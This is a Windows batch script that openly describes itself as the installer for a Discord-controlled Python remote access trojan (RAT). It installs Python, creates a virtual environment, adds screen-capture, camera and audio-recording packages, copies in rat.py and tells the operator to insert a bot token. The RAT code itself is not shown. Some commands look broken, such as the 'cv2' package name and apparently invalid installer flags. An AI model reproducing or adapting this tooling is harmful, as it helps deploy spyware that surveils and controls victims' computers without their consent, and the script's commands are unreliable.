@echo off
chcp 65001 >nul
title AkiraDev7004s Installer

echo ============================================================
echo   AkiraDevs7004s Installer - Installing Python discord Rat
echo ============================================================
echo.

REM Check if Python is installed
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Python not found! Installing now...
    echo.
    
    REM Download and install Python
    echo Downloading Python installer...
    curl -L https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe -o python_installer.exe
    
    echo Starting installation (Press Enter to continue)...
    pause
    
    start /wait python_installer.exe --install-layout user --default-python-home "C:\Python312" --target "C:\Python312" --include-pip --include-venv --include-tcltk --include-test --force-yes
    
    echo.
    echo [OK] Python was installed!
)

echo.
echo ========================================
echo   Creating Virtual Environment...
echo ========================================

REM Create Python venv
python -m venv .venv

echo.
echo ========================================
echo   Installing Dependencies...
echo ========================================

REM Activate environment and upgrade pip
call .venv\Scripts\activate.bat
pip install --upgrade pip

REM Install all required packages
pip install discord.py mss cv2 sounddevice ordered-set zstandard

echo.
echo ========================================
echo   Copying Bot Code...
echo ========================================

REM Copy RAT file into directory (if exists)
if exist rat.py (
    echo [OK] rat.py already found in directory.
) else if exist "C:\Users\%USERNAME%\Desktop\RAT.py" (
    copy "C:\Users\%USERNAME%\Desktop\RAT.py" .
    echo [OK] RAT.py copied from Desktop.
)

echo.
echo ========================================
echo   Installation completed!
echo ========================================
echo.
echo To start the bot, enter:
echo   python rat.py
echo.
echo Note: Before you open rat.py change YOURTOKEN to your real discord bot token!
echo.
pause
